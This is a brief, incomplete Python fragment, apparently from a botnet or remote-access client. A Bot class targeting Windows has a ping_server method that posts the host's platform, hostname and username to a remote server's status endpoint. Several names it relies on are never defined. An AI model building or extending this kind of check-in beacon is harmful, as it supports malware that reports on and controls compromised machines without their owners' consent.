class Bot(object):
	def __init__(self):
		self.platform = "windows"
		

	def ping_server(self):
		r = requests.post(server + '/api/' + self.uid + 'status',
			{'platform': self.platform, 'hostname':self.hostname, 'username':self.username })
		return r.text